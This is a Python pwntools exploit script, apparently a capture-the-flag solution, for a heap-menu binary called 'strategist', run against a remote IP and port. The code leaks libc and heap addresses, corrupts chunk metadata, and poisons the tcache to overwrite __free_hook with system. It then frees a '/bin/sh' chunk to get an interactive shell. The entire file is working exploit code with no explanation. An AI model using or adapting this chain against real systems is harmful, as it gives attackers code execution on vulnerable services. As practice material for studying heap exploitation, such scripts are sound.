from pwn import *

elf = ELF("./strategist_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

# p = process(stdout=PIPE)
# p = process()
p = remote("83.136.251.145", 40904)

def malloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(size).encode())
    p.sendafter(b'> ', data)

def read(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())
    p.recvuntil(f'{idx}]: '.encode())
    return p.recvuntil(b'\n\x1b[1;34m+--', drop=True)

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendafter(b'> ', data)    

def free(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'> ', str(idx).encode())

malloc(0x500, b'asdf') # 0
malloc(0, b'') # 1
free(0)
malloc(0, b'') # 0
libc_base = u64(read(0).ljust(8, b'\x00')) - libc.symbols['main_arena'] - 1168
print(hex(libc_base))
malloc(0, b'') # 2
free(1)
free(2)
malloc(0, b'') # 1
# gdb.attach(p)
# heap_base = u64(read(1).ljust(8, b'\x00')) - 0xb80
heap_base = u64(read(1).ljust(8, b'\x00')) - 0x770
print(hex(heap_base))


# context.log_level = 'debug'
malloc(0x4c0, b'a') # 2 
malloc(0x500, b'a' * 0x500) # 3
malloc(24, b'a' * 24) # 4
malloc(0x20, b'a') # 5
edit(4, 
    flat(
        heap_base + 0x760, heap_base + 0x760,
        32
    ) + b'\x10'
)
free(3)

# gdb.attach(p, "break *create_plan+173")
# pause()
malloc(0x20, b'a' * 16) # 3
malloc(0x20, b'a' * 16) # 6
# free(1)
free(6)
free(3)
edit(4, 
    pack(libc_base + libc.symbols['__free_hook'])[:6]
)
malloc(0x20, b'a' * 16) 
malloc(0x20, pack(libc_base + libc.symbols['system'])) 

malloc(0x20, b'/bin/sh')
free(7)

p.interactive()

